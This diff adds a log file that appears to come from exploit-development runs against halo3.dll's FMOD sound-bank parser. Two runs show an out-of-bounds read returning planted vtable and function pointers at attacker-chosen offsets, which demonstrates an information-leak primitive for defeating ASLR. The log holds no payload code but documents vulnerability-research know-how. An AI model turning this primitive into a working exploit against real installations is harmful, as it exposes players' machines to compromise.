@@ -1,0 +1,43 @@
+### SQ1 run A: DELTA=0x2a0000, plant .text ptr 0x180500e00 at blob+0x2a0000
+[*] mapped halo3.dll @ 0x180000000 (size 0x4768000)
+[*] driving FSB open halo3+0x4e95d0 on 72-byte file (mode_arg=0x0)
+[leak] planted adjacent FMOD object @ 0x3002a2000 (= blob 0x300002000 + 0x2a0000)
+[leak]   +0x00 vtable      = 0x0000000180500e00  (halo3 .text, ASLR'd base)
+[leak]   +0xa8 decode-fnptr= 0x0000000180500e00
+[leak]   +0x160 heap-ptr   = 0x00007ff612345678
+[*] instructions executed: 619
+[*] call path (tail): 0x46b590 stub 0x4e9160 stub 0x461ff0 stub 0xcbd0 stub 0x4e92e0 0x461ff0 stub 0x46b590 stub 0x461ff0 stub 0x4ea150 0x621640 0x4ea400 0x621640
+
+==================== LEAK-REFLECTION (SQ1) ====================
+  planted adjacent object: [0x3002a2000 .. 0x3002a2200)  (blob 0x300002000 + 0x2a0000)
+  >>> the real FMOD parser READ planted pointer bytes at attacker-chosen
+      offsets WITHOUT faulting (OOB read landed in MAPPED memory):
+    halo3+0x4e9400 read 4 byte(s) @ 0x3002a2000  (blob+0x2a0000)  = 0x80500e00
+        ^ low 4 bytes of planted +0x00 vtable ptr = 0x0000000180500e00
+    halo3+0x4ea280 read 4 byte(s) @ 0x3002a2000  (blob+0x2a0000)  = 0x80500e00
+        ^ low 4 bytes of planted +0x00 vtable ptr = 0x0000000180500e00
+    halo3+0x4ea440 read 4 byte(s) @ 0x3002a2000  (blob+0x2a0000)  = 0x80500e00
+        ^ low 4 bytes of planted +0x00 vtable ptr = 0x0000000180500e00
+[=] open() returned to sentinel cleanly. rax=0x13 (FMOD_RESULT; 0=OK)
+
+### SQ1 run B: DELTA=0x100000 (different attacker offset) -> same landing, proves offset-control
+[*] mapped halo3.dll @ 0x180000000 (size 0x4768000)
+[*] driving FSB open halo3+0x4e95d0 on 72-byte file (mode_arg=0x0)
+[leak] planted adjacent FMOD object @ 0x300102000 (= blob 0x300002000 + 0x100000)
+[leak]   +0x00 vtable      = 0x0000000180500e00  (halo3 .text, ASLR'd base)
+[leak]   +0xa8 decode-fnptr= 0x0000000180500e00
+[leak]   +0x160 heap-ptr   = 0x00007ff612345678
+[*] instructions executed: 619
+[*] call path (tail): 0x46b590 stub 0x4e9160 stub 0x461ff0 stub 0xcbd0 stub 0x4e92e0 0x461ff0 stub 0x46b590 stub 0x461ff0 stub 0x4ea150 0x621640 0x4ea400 0x621640
+
+==================== LEAK-REFLECTION (SQ1) ====================
+  planted adjacent object: [0x300102000 .. 0x300102200)  (blob 0x300002000 + 0x100000)
+  >>> the real FMOD parser READ planted pointer bytes at attacker-chosen
+      offsets WITHOUT faulting (OOB read landed in MAPPED memory):
+    halo3+0x4e9400 read 4 byte(s) @ 0x300102000  (blob+0x100000)  = 0x80500e00
+        ^ low 4 bytes of planted +0x00 vtable ptr = 0x0000000180500e00
+    halo3+0x4ea280 read 4 byte(s) @ 0x300102000  (blob+0x100000)  = 0x80500e00
+        ^ low 4 bytes of planted +0x00 vtable ptr = 0x0000000180500e00
+    halo3+0x4ea440 read 4 byte(s) @ 0x300102000  (blob+0x100000)  = 0x80500e00
+        ^ low 4 bytes of planted +0x00 vtable ptr = 0x0000000180500e00
+[=] open() returned to sentinel cleanly. rax=0x13 (FMOD_RESULT; 0=OK)
